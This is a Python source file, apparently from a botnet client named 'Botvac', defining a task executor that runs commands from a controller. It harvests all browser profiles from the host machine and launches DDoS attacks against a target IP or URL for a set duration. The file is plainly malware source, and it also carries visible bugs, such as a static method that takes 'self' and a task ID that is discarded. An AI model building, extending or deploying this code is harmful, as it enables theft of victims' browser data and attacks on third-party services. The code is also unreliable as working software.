import re
from datetime import datetime

from bot.botvac_constants import BotvacConstants
from bot.handlers.browser_harvesting_handler import BrowserHarvestingHandler
from bot.handlers.ddos_handler import DdosHandler
from bot.objects.task import TaskResult
from bot.objects.task import Task


class BotvacTaskExecutor:
    def __init__(self) -> None:
        super().__init__()
        self.task_id = None
        self.target = None
        self.start_time = None
        self.end_time = None
        self.ddos_handler = None
        self.harvest_handler = None

    def prepare_metadata(self, task_id: str = None, target: str = None, start_time: datetime = None,
                         end_time: datetime = None):
        self.task_id = None
        self.target = target
        self.start_time = start_time
        self.end_time = end_time
        self.ddos_handler = DdosHandler(task_id=task_id)
        self.harvest_handler = BrowserHarvestingHandler(task_id=task_id)

    def harvest_browser_profiles(self):
        return self.harvest_handler.get_all_browser_profiles()

    def ddos(self):
        duration = (self.end_time - self.start_time).seconds
        if self.is_ip(target=self.target):
            return self.ddos_handler.start_ddos_to_ip(ip=self.target, duration=duration)
        else:
            return self.ddos_handler.start_ddos_to_url(url=self.target, duration=duration)

    def execute_task(self, task: Task) -> TaskResult:
        result = None
        status = "success"
        try:
            result = str(getattr(self, task.task_type)())
        except Exception as e:
            result = e.__str__()
            status = "failed"
        finally:
            end_time = datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
            task_result_dict = {
                "task_id": task.task_type,
                "end_time": end_time,
                "result":result,
                "status":status
            }
            return TaskResult(data=task_result_dict)

    @staticmethod
    def is_ip(self, target: str):
        ip_regex_result = re.search(BotvacConstants.IP_TESTER_REGEX, target).group()
        return bool(ip_regex_result)  # if None(no result) -> False , else (there is a target) -> True
